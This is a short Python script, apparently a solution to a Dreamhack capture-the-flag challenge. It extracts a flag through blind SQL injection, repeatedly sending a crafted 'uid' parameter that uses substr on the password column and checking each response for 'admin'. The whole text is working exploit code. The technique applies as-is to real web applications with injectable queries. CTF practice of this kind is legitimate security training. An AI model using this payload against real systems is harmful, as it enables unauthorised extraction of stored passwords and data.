import requests, string

port = 12889
url_index = f"http://host3.dreamhack.games:{port}/"
flag = "DH{"
num = 4
cand = string.ascii_letters + string.digits + string.punctuation

while True:
    for char in cand:
        temp = url_index
        temp += f"?uid='||substr(upw,1,{num})='{flag + char}';'"
        response = requests.get(temp)
        if "admin" in response.text:
            num += 1
            flag += char
            if char == "}":
                exit(0)
            break
print(flag)
